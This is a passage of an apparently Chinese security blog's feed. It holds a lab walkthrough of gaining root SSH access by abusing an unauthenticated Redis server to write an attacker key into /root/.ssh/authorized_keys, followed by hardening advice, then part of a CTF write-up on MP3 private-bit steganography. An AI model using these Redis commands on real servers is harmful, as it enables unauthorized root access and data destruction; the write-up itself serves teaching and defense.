&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以root身份启动redis服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试在服务器上自己连一下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a href=&#34;#0x02-攻击机部分准备工作&#34; class=&#34;headerlink&#34; title=&#34;0x02 攻击机部分准备工作&#34;&gt;&lt;/a&gt;0x02 攻击机部分准备工作&lt;/h2&gt;&lt;p&gt;在攻击机上生成rsa秘钥&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;重定向到key.txt&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二句话的含义？其实就是在id_rsa.pub的前后加了一个回车&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后，我们在攻击机（也就是我的kali）上安装redis-cli&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拷贝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
&lt;p&gt;将我们生成的key.txt 放到远程主机(也就是开了redis服务的服务器)的redis-cli内存上，查看远程服务器的ip为：192.168.138.143&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a href=&#34;#0x03-开始攻击&#34; class=&#34;headerlink&#34; title=&#34;0x03 开始攻击&#34;&gt;&lt;/a&gt;0x03 开始攻击&lt;/h2&gt;&lt;p&gt;拿到redis的shell后基本操作：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
&lt;p&gt;在我们的攻击机(kali)上运行如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
&lt;p&gt;将目录切换到/root/.ssh&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到/root/.ssh/authorized_keys ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，redis提权攻击完成。&lt;/p&gt;
&lt;h2 id=&#34;0x04-修复建议-安全加固&#34;&gt;&lt;a href=&#34;#0x04-修复建议-安全加固&#34; class=&#34;headerlink&#34; title=&#34;0x04 修复建议/安全加固&#34;&gt;&lt;/a&gt;0x04 修复建议/安全加固&lt;/h2&gt;&lt;h3 id=&#34;1-禁止一些高危命令-重启redis才能生效&#34;&gt;&lt;a href=&#34;#1-禁止一些高危命令-重启redis才能生效&#34; class=&#34;headerlink&#34; title=&#34;1.禁止一些高危命令(重启redis才能生效)&#34;&gt;&lt;/a&gt;&lt;strong&gt;1.禁止一些高危命令&lt;/strong&gt;(重启redis才能生效)&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者另起名字&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
&lt;h3 id=&#34;2-以低权限运行-Redis-服务&#34;&gt;&lt;a href=&#34;#2-以低权限运行-Redis-服务&#34; class=&#34;headerlink&#34; title=&#34;2.以低权限运行 Redis 服务&#34;&gt;&lt;/a&gt;&lt;strong&gt;2.以低权限运行 Redis 服务&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3-为-Redis-添加密码验证&#34;&gt;&lt;a href=&#34;#3-为-Redis-添加密码验证&#34; class=&#34;headerlink&#34; title=&#34;3.为 Redis 添加密码验证&#34;&gt;&lt;/a&gt;&lt;strong&gt;3.为 Redis 添加密码验证&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;requirepass&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;mypassword&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4-禁止外网访问-Redis&#34;&gt;&lt;a href=&#34;#4-禁止外网访问-Redis&#34; class=&#34;headerlink&#34; title=&#34;4.禁止外网访问 Redis&#34;&gt;&lt;/a&gt;&lt;strong&gt;4.禁止外网访问 Redis&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bind&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;::1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;redis 3.2之后，redis增加了protected-mode ，在这个模式下，非绑定IP或者没有配置密码时都会报错。&lt;/p&gt;
&lt;h3 id=&#34;5-保证-authorized-keys-文件的安全&#34;&gt;&lt;a href=&#34;#5-保证-authorized-keys-文件的安全&#34; class=&#34;headerlink&#34; title=&#34;5.保证 authorized_keys 文件的安全&#34;&gt;&lt;/a&gt;&lt;strong&gt;5.保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
&lt;h3 id=&#34;6-修改默认端口&#34;&gt;&lt;a href=&#34;#6-修改默认端口&#34; class=&#34;headerlink&#34; title=&#34;6.修改默认端口&#34;&gt;&lt;/a&gt;&lt;strong&gt;6.修改默认端口&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的&lt;code&gt;port 6379&lt;/code&gt; ，比如改成&lt;code&gt;port 17033&lt;/code&gt;，让人摸不着头脑。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/</guid>
            <title>Misc——私有bit隐写</title>
            <link>https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/</link>
            <category>CTF小训</category>
            <category>Misc</category>
            <pubDate>Sat, 17 Sep 2022 14:02:32 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;0x01-知识点&#34;&gt;&lt;a href=&#34;#0x01-知识点&#34; class=&#34;headerlink&#34; title=&#34;0x01 知识点&#34;&gt;&lt;/a&gt;&lt;strong&gt;0x01 知识点&lt;/strong&gt;&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;typedef FrameHeader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;// 类型     字段名:bit数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sync:12;                        //同步信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int version:2;                      //版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int layer: 2;                       //层&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int error protection:1;             //CRC校验&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int bitrate_index:4;                //位率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sampling_frequency:2;           //采样频率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int padding:1;                      //帧长调节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int private:1;                      //保留字 【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode:2;                         //声道模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode extension:2;        		 //扩充模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int copyright:1;                    //版权   【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int original:1;                     //原版标志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int emphasis:2;                     //强调模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;帧长度是压缩时每一帧的长度，&lt;code&gt;包括帧头&lt;/code&gt;的4个字节（32bit）。它将填充的空位也计算在内。&lt;/li&gt;
&lt;li&gt;padding的值会影响每一帧的长度（具体分析见下面的题目），因为只有1位，因此长度也只限于在0和1之间变化&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x02-题目分析&#34;&gt;&lt;a href=&#34;#0x02-题目分析&#34; class=&#34;headerlink&#34; title=&#34;0x02 题目分析&#34;&gt;&lt;/a&gt;0x02 题目分析&lt;/h2&gt;&lt;p&gt;将解压后的&lt;code&gt;1.mp3&lt;/code&gt;文件用 010Editor 打开&lt;/p&gt;
&lt;p&gt;可以看到一个mp3文件，里面基本上由mf数组构成。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917115510767.png&#34; alt=&#34;image-20220917115510767&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析详见图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120013835.png&#34; alt=&#34;image-20220917120013835&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着，可以发现，每个mf数组大小不一，有的是0x1A1，有的0x1A2&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120301874.png&#34; alt=&#34;image-20220917120301874&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图中可知，private_bit的数值的在0和1中变化，可以让&lt;code&gt;copyright&lt;/code&gt; 、&lt;code&gt;private_bit&lt;/code&gt;这样的单bit位在 0 和 1 之间发生改变，进而影响了单独mf数组的大小。因此，这两位在整个mf数组中连续拼接可能藏有flag或者重要的信息，优先提取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x03-解析脚本&#34;&gt;&lt;a href=&#34;#0x03-解析脚本&#34; class=&#34;headerlink&#34; title=&#34;0x03 解析脚本&#34;&gt;&lt;/a&gt;0x03 解析脚本&lt;/h2&gt;&lt;p&gt;脚本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   n = &lt;span class=&#34;number&#34;&gt;0x399D0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0x294C6A&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   textArr = re.findall(&lt;span 